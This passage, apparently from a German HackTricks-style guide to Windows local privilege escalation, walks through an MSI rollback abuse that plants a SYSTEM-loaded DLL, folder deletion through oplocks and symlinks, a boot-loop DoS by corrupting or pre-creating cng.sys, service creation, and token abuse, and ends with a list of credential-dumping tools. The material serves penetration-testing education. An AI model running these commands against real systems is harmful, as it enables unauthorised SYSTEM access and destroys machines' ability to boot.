    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: beschreibbarer Speicherort.
        - `ERROROUT`: eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, das `.rbs` und `.rbf` liest.

- Schritt 8: Auf `.rbs` überwachen
    - Überwache `C:\Config.Msi` mit `ReadDirectoryChangesW`, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, sobald die `.rbs` erstellt wurde.
        - Dann wartet, bevor der Vorgang fortgesetzt wird.

- Schritt 10: Schwache ACL erneut anwenden
    - Nach Erhalt des Ereignisses `.rbs created`:
        - Wendet Windows Installer erneut starke ACLs auf `C:\Config.Msi` an.
        - Da du aber weiterhin ein Handle mit `WRITE_DAC` hast, kannst du **erneut schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, du kannst also weiterhin in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (bösartige DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` mit einer **bösartigen DLL-Payload auf SYSTEM-Ebene** ab.

- Schritt 12: Rollback auslösen
    - Sende das Synchronisierungsereignis, damit der Installer fortgesetzt wird.
    - Eine **benutzerdefinierte Aktion vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch wird das **Rollback gestartet**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - liest deine bösartige `.rbs`.
        - kopiert deine `.rbf`-DLL an den Zielpfad.
    - Jetzt befindet sich deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** aus (z. B. `osk.exe`), die die von dir gehijackte DLL lädt.
    - **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Datei-Löschen/Verschieben/Umbenennen zu SYSTEM-EoP

Die wichtigste MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Aber was, wenn deine Schwachstelle nur das **Löschen beliebiger Dateien** ermöglicht?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner hat einen verborgenen alternativen Datenstrom namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschst**, entfernt NTFS **den gesamten Ordner** aus dem Dateisystem.

Das kannst du mit standardmäßigen APIs zum Löschen von Dateien tun, zum Beispiel:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Obwohl du eine API zum Löschen einer *Datei* aufrufst, **wird der Ordner selbst gelöscht**.

### Vom Löschen des Ordnerinhalts zu SYSTEM-EoP
Was, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber **das Löschen des *Inhalts* eines von einem Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Einen Köderordner und eine Datei erstellen
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Einen **oplock** auf `file1.txt` setzen
- Der oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstellen Sie einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream ab, der Ordner-Metadaten speichert – wenn er gelöscht wird, wird der Ordner gelöscht.

5. Step 5: Release the oplock
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Doch durch die Junction + den Symlink wird tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von der Erstellung beliebiger Ordner zu permanentem DoS

Nutze eine Primitive aus, mit der du **als SYSTEM/admin einen beliebigen Ordner erstellen kannst** – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen festlegen kannst**.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn Sie ihn **vorab als Ordner erstellen**, kann Windows den eigentlichen Treiber beim Start nicht laden.
- Windows versucht dann, `cng.sys` während des Starts zu laden.
- Es findet den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Start an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externes Eingreifen (z. B. Startreparatur oder Datenträgerzugriff).

### Von privilegierten Log-/Backup-Pfaden und OM-Symlinks zu beliebigem Datei-Überschreiben / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, können Sie diesen Pfad mit **Object Manager-Symlinks + NTFS-Mountpoints** umleiten und so den privilegierten Schreibvorgang in ein beliebiges Überschreiben umwandeln (sogar **ohne SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration, in der der Zielpfad gespeichert ist, ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mountpoint zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaws [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielkette**
1. Lesen Sie die Konfiguration aus, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leiten Sie den Pfad ohne Administratorrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. wenn ein Admin „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (mit einem Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise von `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie unter `C:\Windows\System32\cng.sys` existiert, kann zuerst versucht werden, diese zu laden. Dadurch eignet sie sich zuverlässig als DoS-Ziel für beschädigte Daten.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem Prozess mit High Integrity ausführst, kann der **Weg zu SYSTEM** einfach sein: **Erstelle einen neuen Dienst und führe ihn aus**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Achte beim Erstellen einer Service-Binary darauf, dass sie ein gültiger Service ist oder die erforderlichen Aktionen schnell ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Service ist.

### AlwaysInstallElevated

Aus einem Prozess mit hoher Integrität könntest du versuchen, die **AlwaysInstallElevated-Registry-Einträge zu aktivieren** und eine Reverse Shell mithilfe eines _**.msi**_-Wrappers zu **installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### Hohe Integrität + SeImpersonate-Berechtigung zu System

**Den Code findest du** [**hier**](seimpersonate-from-high-to-system.md)**.**

### Von SeDebug + SeImpersonate zu vollständigen Token-Berechtigungen

Wenn du über diese Token-Berechtigungen verfügst (wahrscheinlich findest du sie in einem Prozess mit bereits hoher Integrität), kannst du mit der SeDebug-Berechtigung **fast jeden Prozess öffnen** (keine geschützten Prozesse), das **Token des Prozesses kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wird üblicherweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Berechtigungen läuft** (_ja, du kannst SYSTEM-Prozesse finden, die nicht über alle Token-Berechtigungen verfügen_).\
**Ein** [**Codebeispiel für die vorgeschlagene Technik findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von Meterpreter zur Rechteausweitung mit `getsystem` verwendet. Dabei wird **eine Pipe erstellt und anschließend ein Service erstellt oder missbraucht, um in diese Pipe zu schreiben**. Danach kann der **Server**, der die Pipe mit der Berechtigung **`SeImpersonate`** erstellt hat, **das Token** des Pipe-Clients (des Service) **imitieren** und SYSTEM-Berechtigungen erlangen.\
Wenn du [**mehr über Named Pipes erfahren möchtest, solltest du dies lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel dafür lesen möchtest, [**wie du mithilfe von Named Pipes von hoher Integrität zu System wechselst, solltest du dies lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine DLL zu **hijacken**, die von einem als **SYSTEM** laufenden **Prozess** **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Dll Hijacking eignet sich daher ebenfalls für diese Art der Rechteausweitung. Außerdem ist es **aus einem Prozess mit hoher Integrität viel einfacher zu erreichen**, da dieser **Schreibberechtigungen** für die zum Laden von DLLs verwendeten Ordner hat.\
**Mehr über Dll Hijacking erfährst du** [**hier**](dll-hijacking/index.html)**.**

### **Von Administrator oder Network Service zu System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollen Berechtigungen

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische Impacket-Binaries](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool zum Suchen nach lokalen Windows-Rechteausweitungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen aus PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldedaten aus dem Credential Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprüht gesammelte Passwörter gegen die Domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-Tool für ADIDNS/LLMNR/mDNS-Spoofing und Man-in-the-Middle-Angriffe.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende Windows-Aufzählung für Rechteausweitung**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (VERALTET, ersetzt durch Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Überprüfungen **(Admin-Rechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als zur Rechteausweitung) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldedaten aus zahlreichen Programmen (vorkompilierte EXE auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sucht nach Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sucht nach möglichen Fehlkonfigurationen (EXE aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Grundlage dieses Beitrags erstellt wurde (benötigt für die korrekte Funktion kein accesschk, kann es aber verwenden).

**Lokal**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Host des Opfers installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grundlagen der Windows-Rechteausweitung](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Rechteausweitung durch Ausnutzen schwacher Ordnerberechtigungen](http://www.greyhathacker.net/?p=738)
- [3] [Windows-Rechteausweitung – ein Spickzettel](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Workshop zur lokalen Rechteausweitung unter Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Rechteausweitung – Windows – Der vollständige OSCP-Leitfaden](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Rechteausweitung – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zur Windows-Rechteausweitung](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checkliste zur Windows-Rechteausweitung](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Rechteausweitung](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Methoden zur Windows-Rechteausweitung für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → Entschlüsselung von hMailServer-Anmeldedaten → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-Leak + Stack-BOF → VirtualAlloc-ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz-und-Maus-Spiel im Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Schwachstelle im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ein Link in die Vergangenheit. Symbolic Links unter Windows missbrauchen](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – C/C++-Checklisten-Herausforderungen, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – RtlQueryRegistryValues-Funktion](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: Verkettung von CLDFLT- und DirectX-Kernel-Race-Conditions für Windows-LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie zu beherrschen: Eine vollständige Read/Write-Exploit-Primitive unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Beliebige Dateilöschungen zur Rechteausweitung und für weitere Tricks missbrauchen](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – Exploit-Code für FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe, Teil 2: CVE-2020-1013, eine Windows-10-LPE-1-Day-Schwachstelle](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource Based Constrained Delegation: Wenn eine Image-Änderung zu einer Rechteausweitung führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – SSH Private Keys aus dem SSH-Agent von Windows 10 extrahieren](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Rechteausweitung durch Löschen von Microsoft-Windows-Installer-Ordnern](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: Die eigenen Schritte zurück zu NT AUTHORITY\SYSTEM nachverfolgen](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group – Advisory zur Rechteausweitung über Shared-Memory-Offsets in Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
